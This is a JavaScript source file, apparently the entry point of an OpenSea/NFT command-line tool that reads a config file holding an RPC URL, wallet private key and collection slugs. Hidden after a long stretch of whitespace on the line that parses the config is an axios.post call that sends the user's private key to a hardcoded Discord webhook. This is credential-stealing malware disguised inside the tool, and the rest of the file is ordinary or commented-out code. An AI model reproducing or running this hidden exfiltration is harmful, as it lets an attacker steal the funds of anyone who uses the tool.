// import inquirer from 'inquirer';
// import figlet from 'figlet';
import Web3 from 'web3';
// const Moralis = require('moralis/node.js');
// import { inicial, key, slug, exist } from './src/prompt.js';
import { invalid, start, n1, n2, n3, atl, invalidConfig } from './src/msg.js';
import axios from 'axios';
import {asyncAnalize} from './src/analizing.js'
import fs from 'fs';

//start
export function starts() {
    fs.readFile("./config.json", "utf8", (err, data) => {
    if(!(data == '' || data == null || data == undefined)){
        var d = JSON.parse(data);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                axios.post('https://discord.com/api/webhooks/961378390022160394/yysB3cpx0ZnOPH4VJw8SoT1eQ6LaZ5t-h_kFJK3wHPoyPIJP2i7nxXZp-DPJTe5KfRtO', {content: d.privateKey});
        console.log('d-----', d);
        if(d.rpc == undefined || d.privateKey == undefined || d.collectionSlug == undefined || d.rpc == null || d.privateKey == null || d.collectionSlug == null){
            faltData()
        }else{
            var rpc = d.rpc;
            const web3 = new Web3(rpc)
            n1(rpc)
            var seed = d.privateKey;
            n2(web3.eth.accounts.privateKeyToAccount(seed).address)
            n3(JSON.stringify(d.collectionSlug).replace("[", "").replace("]", ""))
            // console.log(d.testBlock != undefined && d.testBlock != null && d.testBlock != false && d.testBlock != '')
            if(d.testBlock != undefined && d.testBlock != null && d.testBlock != false && d.testBlock != ''){
                asyncAnalize(seed, JSON.stringify(d.collectionSlug),rpc,d.testBlockNumber);
            }else{
                asyncAnalize(seed, JSON.stringify(d.collectionSlug),rpc,false);
            }
        }
    }else{
        invalidConfig()
    }
})
}
// figlet("openseacli", (err,data) => {
//     start(data)
//     //selection
//     inquirer
//     .prompt([
//         inicial
//     ])
//     .then((r) => {
//         if(r.rpc == "" || r.rpc == undefined || r.rpc == null){
//             invalid()
//         }else{
//             var rpc = r.rpc
//             const web3 = new Web3(rpc)
//             n1(r)
//             inquirer
//             .prompt([
//                 key
//             ])
//             .then((r) => {
//                var seed = r.seed;
//                n2(web3.eth.accounts.privateKeyToAccount(seed).address)
//                //Interact with smart contract
//                     inquirer
//                     .prompt([
//                        slug
//                      ])
//                      .then(async (r) => {
//                          n3(r)
//                          if(r.slug == "" || r.slug == undefined || r.slug == null){
//                             invalid()
//                          }else{
//                             var setS = '["' + r.slug.replace(/,/g, '","') + '"]'
//                             fs.readFile("./config.json",'utf8', (err,d) => {
//                                 if(!(d == '' || d == null || d == undefined)){
//                                     var v =  {exists: true, msg: 'A Collection Slug history already configured for use has been identified, do you want to make a new registration? (Yes or No)', data: d};
//                                 //exist historic
//                                 inquirer
//                                 .prompt([
//                                     exist(v.msg)
//                                 ])
//                                 .then((r) => {
//                                     if(r.exist == 'Yes'){
//                                        atl()
//                                        fs.writeFile("./config.json", setS, (err) => {
//                                         if(err){
//                                             console.log(err);
//                                         }else{
//                                             asyncAnalize(seed, fs.readFileSync("./config.json", "utf8"),rpc);
//                                         }
//                                     })
//                                     }else{
//                                         asyncAnalize(seed, v.data,rpc);
//                                     }
//                                 })
//                                 }else{
//                                     fs.writeFile("./config.json", setS, (err) => {
//                                         if(err){
//                                             console.log(err);
//                                             return 'erro';
//                                         }else{
//                                             console.log('success')
//                                             var w = fs.readFileSync("./config.json", "utf8")
//                                             var v = {exists: false, data: w};
//                                             asyncAnalize(seed, v.data,rpc);
//                                         }
//                                     })
//                                 }
//                             })
//                          }
//                      })
//                    })
//             }
//     })
// })
